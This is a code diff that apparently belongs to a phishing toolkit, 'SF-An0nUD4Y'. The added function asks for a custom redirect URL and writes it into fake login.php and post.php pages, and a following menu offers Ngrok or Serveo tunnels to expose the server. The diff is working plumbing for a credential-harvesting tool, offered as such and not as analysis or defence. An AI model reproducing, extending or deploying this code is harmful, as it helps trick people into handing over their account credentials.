@@ -324,6 +324,34 @@ def runServer():
 if __name__ == "__main__":
     try:
         runPEnv()
+        def custom():
+            print("\n Insert a custom redirect url: ")
+            custom = input('\n SF-An0nUD4Y > ')
+            if 'http://' in custom:
+                pass
+            else:
+                custom = 'http://' + custom
+            if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
+                with open('Server/www/login.php') as f:
+                    read_data = f.read()
+                c = read_data.replace('<CUSTOM>', custom)
+                f = open('Server/www/login.php', 'w')
+                f.write(c)
+                f.close()
+                with open('Server/www/post.php') as f:
+                    read_data = f.read()
+                c = read_data.replace('<CUSTOM>', custom)
+                f = open('Server/www/post.php', 'w')
+                f.write(c)
+                f.close()
+            else:
+                with open('Server/www/login.php') as f:
+                    read_data = f.read()
+                c = read_data.replace('<CUSTOM>', custom)
+                f = open('Server/www/login.php', 'w')
+                f.write(c)
+                f.close()
+        custom()
         def server():
                 print("\n Server you want to use".format(CYAN, END))
                 print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, END))
